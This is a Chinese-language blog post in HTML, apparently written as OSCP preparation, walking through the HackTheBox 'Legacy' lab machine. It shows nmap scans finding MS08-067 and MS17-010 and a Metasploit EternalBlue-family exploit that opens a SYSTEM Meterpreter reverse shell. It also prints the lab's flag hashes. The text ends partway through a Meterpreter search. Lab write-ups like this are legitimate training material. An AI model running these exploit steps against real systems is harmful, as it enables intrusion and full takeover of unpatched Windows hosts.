@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>HTB靶机 Legacy WriteUp - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="author-link" content="">
+<meta name="description" content="备战OSCP系列，从HackTheBox靶场开始。" /><meta name="keywords" content='HTB, OSCP' /><meta itemprop="name" content="HTB靶机 Legacy WriteUp">
+<meta itemprop="description" content="备战OSCP系列，从HackTheBox靶场开始。"><meta itemprop="datePublished" content="2022-03-20T17:40:46+08:00" />
+<meta itemprop="dateModified" content="2022-03-20T17:40:46+08:00" />
+<meta itemprop="wordCount" content="1300">
+<meta itemprop="keywords" content="HTB,OSCP," /><meta property="og:title" content="HTB靶机 Legacy WriteUp" />
+<meta property="og:description" content="备战OSCP系列，从HackTheBox靶场开始。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.bthoughts.top/posts/htb%E9%9D%B6%E6%9C%BA-legacy-writeup/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-20T17:40:46+08:00" />
+<meta property="article:modified_time" content="2022-03-20T17:40:46+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB靶机 Legacy WriteUp"/>
+<meta name="twitter:description" content="备战OSCP系列，从HackTheBox靶场开始。"/>
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://www.bthoughts.top/posts/htb%E9%9D%B6%E6%9C%BA-legacy-writeup/" /><link rel="prev" href="https://www.bthoughts.top/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/" /><link rel="next" href="https://www.bthoughts.top/posts/htb%E9%9D%B6%E6%9C%BA-lame-writeup/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "HTB靶机 Legacy WriteUp",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/www.bthoughts.top\/posts\/htb%E9%9D%B6%E6%9C%BA-legacy-writeup\/"
+    },"genre": "posts","keywords": "HTB, OSCP","wordcount":  1300 ,
+    "url": "https:\/\/www.bthoughts.top\/posts\/htb%E9%9D%B6%E6%9C%BA-legacy-writeup\/","datePublished": "2022-03-20T17:40:46+08:00","dateModified": "2022-03-20T17:40:46+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": "备战OSCP系列，从HackTheBox靶场开始。"
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tools/"
+                
+                
+              ><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li>
+      </ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tools/"
+                  
+                  
+                ><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
+        <span>HTB靶机 Legacy WriteUp</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
+          <span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div>
+      <div class="post-meta-line"><span title=2022-03-20&#32;17:40:46><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-20">2022-03-20</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 1300 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 3 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#legacy">Legacy</a></li>
+    <li><a href="#writeup">WriteUp</a>
+      <ul>
+        <li><a href="#0scan">0.SCAN</a></li>
+        <li><a href="#1ms17-010">1.ms17-010</a></li>
+        <li><a href="#2ms08-067">2.ms08-067</a></li>
+      </ul>
+    </li>
+    <li><a href="#他山之玉">他山之玉</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><p>备战OSCP系列，从HackTheBox靶场开始。</p>
+<h2 id="legacy">Legacy</h2>
+<p><img loading="lazy" src="/resource/HTB%e9%9d%b6%e6%9c%ba-Legacy-WriteUp.assets/640-20230220174153127.png" srcset="/resource/HTB%e9%9d%b6%e6%9c%ba-Legacy-WriteUp.assets/640-20230220174153127.png, /resource/HTB%e9%9d%b6%e6%9c%ba-Legacy-WriteUp.assets/640-20230220174153127.png 1.5x, /resource/HTB%e9%9d%b6%e6%9c%ba-Legacy-WriteUp.assets/640-20230220174153127.png 2x" sizes="auto" data-title="图片" data-alt="图片" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>用户评分2.5分，Tags：Injection</p>
+<p>顺便说一句，这个跟oscp lab里的某靶机几乎一模一样。。</p>
+<p>考点：SMB漏洞</p>
+<h2 id="writeup">WriteUp</h2>
+<h3 id="0scan">0.SCAN</h3>
+<p>nmap扫描服务，需要用-Pn</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ nmap  -F 10.10.10.4 
+</span></span><span class="line"><span class="cl"> Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-15 12:58 HKT
+</span></span><span class="line"><span class="cl"> Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+</span></span><span class="line"><span class="cl"> Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">0</span> hosts up<span class="o">)</span> scanned in 3.07 seconds
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> $ nmap -Pn -T4 10.10.10.4
+</span></span><span class="line"><span class="cl"> Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-15 13:01 HKT
+</span></span><span class="line"><span class="cl"> Nmap scan report <span class="k">for</span> 10.10.10.4
+</span></span><span class="line"><span class="cl"> Host is up <span class="o">(</span>0.24s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"> Not shown: <span class="m">997</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl"> 139/tcp open   netbios-ssn
+</span></span><span class="line"><span class="cl"> 445/tcp open   microsoft-ds
+</span></span><span class="line"><span class="cl"> 3389/tcp closed ms-wbt-server
+</span></span><span class="line"><span class="cl"> 
+</span></span></code></pre></div><p>使用-sC 后结果如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> Host script results:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_clock-skew: mean: 5d01h01m43s, deviation: 1h24m50s, median: 5d00h01m43s
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> p2p-conficker: 
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   Checking <span class="k">for</span> Conficker.C or higher...
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   Check <span class="m">1</span> <span class="o">(</span>port 40600/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   Check <span class="m">2</span> <span class="o">(</span>port 62576/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   Check <span class="m">3</span> <span class="o">(</span>port 50902/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   Check <span class="m">4</span> <span class="o">(</span>port 36848/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> smb-os-discovery: 
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   OS: Windows XP <span class="o">(</span>Windows <span class="m">2000</span> LAN Manager<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_xp::-
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   Computer name: legacy
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   NetBIOS computer name: LEGACY<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   Workgroup: HTB<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_ System time: 2022-03-20T09:07:28+02:00
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> smb-security-mode: 
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   account_used: guest
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_ message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:8c:eb <span class="o">(</span>VMware<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span></code></pre></div><p>使用 &ndash;script vuln 快速查找相应漏洞，结果如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl"> 139/tcp open   netbios-ssn
+</span></span><span class="line"><span class="cl"> 445/tcp open   microsoft-ds
+</span></span><span class="line"><span class="cl"> 3389/tcp closed ms-wbt-server
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> Host script results:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_smb-vuln-ms10-054: <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_smb-vuln-ms10-061: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> smb-vuln-ms08-067: 
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   VULNERABLE:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   Microsoft Windows system vulnerable to remote code execution <span class="o">(</span>MS08-067<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     State: VULNERABLE
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     IDs: CVE:CVE-2008-4250
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>           The Server service in Microsoft Windows <span class="m">2000</span> SP4, XP SP2 and SP3, Server <span class="m">2003</span> SP1 and SP2,
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>           Vista Gold and SP1, Server 2008, and <span class="m">7</span> Pre-Beta allows remote attackers to execute arbitrary
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>           code via a crafted RPC request that triggers the overflow during path canonicalization.
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>           
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Disclosure date: 2008-10-23
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     References:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_     https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2008-4250
+</span></span><span class="line"><span class="cl"> <span class="p">|</span> smb-vuln-ms17-010: 
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   VULNERABLE:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     State: VULNERABLE
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     IDs: CVE:CVE-2017-0143
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Risk factor: HIGH
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>       A critical remote code execution vulnerability exists in Microsoft SMBv1
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>       servers <span class="o">(</span>ms17-010<span class="o">)</span>.
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>           
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     Disclosure date: 2017-03-14
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>     References:
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_     https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-0143
+</span></span><span class="line"><span class="cl"> <span class="p">|</span>_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+</span></span><span class="line"><span class="cl"> 
+</span></span></code></pre></div><p>可利用：ms08-067,ms17-010</p>
+<h3 id="1ms17-010">1.ms17-010</h3>
+<p>使用MSF，查找相应漏洞利用模块</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> $ msfconsole
+</span></span><span class="line"><span class="cl"> msf6 &gt; search ms17-010
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> Matching <span class="nv">Modules</span>
+</span></span><span class="line"><span class="cl"> <span class="o">================</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">    <span class="c1"># Name                                     Disclosure Date Rank     Check Description</span>
+</span></span><span class="line"><span class="cl">    -  ----                                      ---------------  ----     -----  -----------
+</span></span><span class="line"><span class="cl">    <span class="m">0</span> exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average Yes   MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+</span></span><span class="line"><span class="cl">    <span class="m">1</span> exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+</span></span><span class="line"><span class="cl">    <span class="m">2</span> auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+</span></span><span class="line"><span class="cl">    <span class="m">3</span> auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+</span></span><span class="line"><span class="cl">    <span class="m">4</span> exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great   Yes   SMB DOUBLEPULSAR Remote Code Execution
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> Interact with a module by name or index. For example info 4, use <span class="m">4</span> or use exploit/windows/smb/smb_doublepulsar_rce
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> msf6 &gt; use exploit/windows/smb/ms17_010_psexec 
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl"> msf6 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> rhosts 10.10.10.4
+</span></span><span class="line"><span class="cl"> <span class="nv">rhosts</span> <span class="o">=</span>&gt; 10.10.10.4
+</span></span><span class="line"><span class="cl"> msf6 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; <span class="nb">set</span> lhost 10.10.14.2
+</span></span><span class="line"><span class="cl"> <span class="nv">lhost</span> <span class="o">=</span>&gt; 10.10.14.2
+</span></span><span class="line"><span class="cl"> msf6 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.2:4444 
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - Target OS: Windows 5.1
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - Filling barrel with fish... <span class="k">done</span>
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - &lt;---------------- <span class="p">|</span> Entering Danger Zone <span class="p">|</span> ----------------&gt;
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 -   <span class="o">[</span>*<span class="o">]</span> Preparing dynamite...
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 -           <span class="o">[</span>*<span class="o">]</span> Trying stick <span class="m">1</span> <span class="o">(</span>x86<span class="o">)</span>...Boom!
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 -   <span class="o">[</span>+<span class="o">]</span> Successfully Leaked Transaction!
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 -   <span class="o">[</span>+<span class="o">]</span> Successfully caught Fish-in-a-barrel
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - &lt;---------------- <span class="p">|</span> Leaving Danger Zone <span class="p">|</span> ----------------&gt;
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81e77660
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - Built a write-what-where primitive...
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>+<span class="o">]</span> 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - Selecting native target
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - Uploading payload... CUwrRlZx.exe
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - Created <span class="se">\C</span>UwrRlZx.exe...
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>+<span class="o">]</span> 10.10.10.4:445 - Service started successfully...
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">175174</span> bytes<span class="o">)</span> to 10.10.10.4
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> 10.10.10.4:445 - Deleting <span class="se">\C</span>UwrRlZx.exe...
+</span></span><span class="line"><span class="cl"> <span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.10.14.2:4444 -&gt; 10.10.10.4:1031 <span class="o">)</span> at 2022-03-1513:52:36 +0800
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> meterpreter &gt; 
+</span></span><span class="line"><span class="cl"> meterpreter &gt; getsystem 
+</span></span><span class="line"><span class="cl"> ...got system via technique <span class="m">1</span> <span class="o">(</span>Named Pipe Impersonation <span class="o">(</span>In Memory/Admin<span class="o">))</span>.
+</span></span><span class="line"><span class="cl"> meterpreter &gt; shell 
+</span></span><span class="line"><span class="cl"> <span class="nb">cd</span> C:<span class="se">\D</span>ocuments and Settings<span class="se">\j</span>ohn<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl"> C:<span class="se">\D</span>ocuments and Settings<span class="se">\j</span>ohn<span class="se">\D</span>esktop&gt;more user.txt   
+</span></span><span class="line"><span class="cl"> more user.txt
+</span></span><span class="line"><span class="cl"> e69af0e4f443de7e36876fda4ec7644f
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> <span class="nb">cd</span> C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl"> C:<span class="se">\D</span>ocuments and Settings<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;more root.txt
+</span></span><span class="line"><span class="cl"> more root.txt
+</span></span><span class="line"><span class="cl"> 993442d258b0e0ec917cae9e695d5713
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> <span class="c1"># shell 进去太笨重了</span>
+</span></span><span class="line"><span class="cl"> meterpreter &gt; search -f user.txt
+</span></span><span class="line"><span class="cl"> Found <span class="m">1</span> result...
+</span></span><span class="line"><span class="cl"> <span class="o">=================</span>
+</span></span><span class="line"><span class="cl"> Path                                             Size <span class="o">(</span>bytes<span class="o">)</span> Modified <span class="o">(</span>UTC<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> ----                                             ------------  --------------
+</span></span><span class="line"><span class="cl"> c:<span class="se">\D</span>ocuments and Settings<span class="se">\j</span>ohn<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt  <span class="m">32</span>            2017-03-16 14:19:49 +0800
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> meterpreter &gt; cat <span class="s2">&#34;c:\Documents and Settings\john\Desktop\user.txt&#34;</span>
+</span></span><span class="line"><span class="cl"> e69af0e4f443de7e36876fda4ec7644
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> meterpreter &gt; search -f root.txt
+</span></span><span class="line"><span class="cl"> Found <span class="m">1</span> result...
+</span></span><span class="line"><span class="cl"> <span class="o">=================</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> Path                                                     Size <span class="o">(</span>bytes<span class="o">)</span> Modified <span class="o">(</span>UTC<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> ----                                                      ------------  --------------
